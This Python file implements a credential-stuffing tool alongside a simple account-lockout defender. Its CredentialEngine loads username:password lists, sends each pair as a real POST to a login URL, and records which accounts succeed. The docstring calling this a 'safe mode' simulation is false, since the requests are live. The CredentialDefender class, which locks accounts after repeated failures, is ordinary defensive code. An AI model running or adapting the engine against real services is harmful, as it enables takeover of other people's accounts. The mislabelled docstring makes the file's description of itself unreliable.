"""Credential Stuffing Core"""
import json, hashlib, time, os, threading
from collections import defaultdict
from datetime import datetime

class CredentialEngine:
    def __init__(self, threads=10, delay=0.5):
        self.threads = threads
        self.delay = delay
        self.results = {"valid": [], "invalid": [], "errors": []}
        self.lock = threading.Lock()
    
    def load_credentials(self, filepath):
        creds = []
        with open(filepath) as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    user, passwd = line.split(":", 1)
                    creds.append((user, passwd))
                elif "," in line:
                    user, passwd = line.split(",", 1)
                    creds.append((user, passwd))
        return creds
    
    def test_credential(self, url, username, password, session=None):
        """Simulate credential test (safe mode)"""
        import requests
        try:
            resp = requests.post(url, data={"username": username, "password": password},
                               timeout=10, allow_redirects=False)
            success = any(s in resp.text.lower() for s in ["dashboard", "welcome", "logout"])
            return {"username": username, "success": success, "status_code": resp.status_code}
        except Exception as e:
            return {"username": username, "success": False, "error": str(e)}
    
    def run_campaign(self, url, credentials, callback=None):
        for user, passwd in credentials:
            result = self.test_credential(url, user, passwd)
            with self.lock:
                if result.get("success"):
                    self.results["valid"].append(result)
                elif result.get("error"):
                    self.results["errors"].append(result)
                else:
                    self.results["invalid"].append(result)
            if callback: callback(result)
            time.sleep(self.delay)
        return self.results

class CredentialDefender:
    def __init__(self, max_attempts=5, lockout_time=900):
        self.max_attempts = max_attempts
        self.lockout_time = lockout_time
        self.attempts = defaultdict(list)
        self.locked = {}
    
    def record_attempt(self, username, ip, success=False):
        now = time.time()
        if success:
            self.attempts[username] = []
            return {"allowed": True}
        self.attempts[username].append({"ip": ip, "time": now})
        recent = [a for a in self.attempts[username] if now - a["time"] < self.lockout_time]
        self.attempts[username] = recent
        if len(recent) >= self.max_attempts:
            self.locked[username] = now
            return {"allowed": False, "reason": "Account locked", "unlock_at": now + self.lockout_time}
        return {"allowed": True, "remaining": self.max_attempts - len(recent)}
    
    def is_locked(self, username):
        if username in self.locked:
            if time.time() - self.locked[username] < self.lockout_time:
                return True
            del self.locked[username]
        return False
